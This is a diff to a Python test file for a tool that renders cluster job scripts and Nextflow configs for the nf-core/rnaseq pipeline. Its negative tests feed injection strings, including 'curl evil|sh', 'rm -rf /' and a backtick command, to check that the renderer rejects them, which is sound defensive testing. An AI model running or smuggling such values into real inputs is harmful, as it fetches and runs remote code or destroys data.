@@ -50,10 +50,13 @@ def test_render_substitutes_all_slots_and_no_tokens_left():
     assert "module add singularity/3.10.4" in script
     assert "cd /net/x/runs/nfcore_rnaseq_260709" in script
     assert "nextflow run nf-core/rnaseq -r 3.16.1 -profile singularity" in script
+    assert "-c luria.config" in script                    # local reference genomes
+    assert "-params-file params.yml" in script            # curated per-pipeline params
     assert "--input samplesheet.csv" in script
     assert "--genome GRCm39" in script          # threaded, not hardcoded
     assert "-w /net/x/work/nfcore_rnaseq" in script
     assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
+    assert "export NXF_SYNTAX_PARSER=v1" in script        # legacy parser for nf-core configs
     assert "{{" not in script and "}}" not in script
 
 
@@ -94,3 +97,27 @@ def test_render_run_script_rejects_injected_genome():
         render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
                           run_dir="/r", work_dir="/w", singularity_cache="/c",
                           genome="GRCh38; curl evil|sh", resources={})
+
+
+def test_render_luria_config_substitutes_refs_root():
+    from chat_nextseek.luria.run_script import render_luria_config
+    cfg = render_luria_config("/net/bmc-pub10/data1/bmc/pipeline_cd/refs")
+    assert "{{REFS_ROOT}}" not in cfg
+    # every genome key resolves to a local file under the refs root
+    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
+    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/gencode.vM39.basic.annotation.gtf.gz" in cfg
+    assert "'Mfas6.0'" in cfg and "'Mmul_10'" in cfg
+
+
+def test_render_luria_config_strips_trailing_slash():
+    from chat_nextseek.luria.run_script import render_luria_config
+    cfg = render_luria_config("/net/x/refs/")
+    assert "/net/x/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
+    assert "/net/x/refs//GRCh38" not in cfg
+
+
+def test_render_luria_config_rejects_bad_refs_root():
+    from chat_nextseek.luria.run_script import render_luria_config
+    for bad in ("", "/net/x; rm -rf /", "a b", "x`id`"):
+        with pytest.raises(ValueError):
+            render_luria_config(bad)
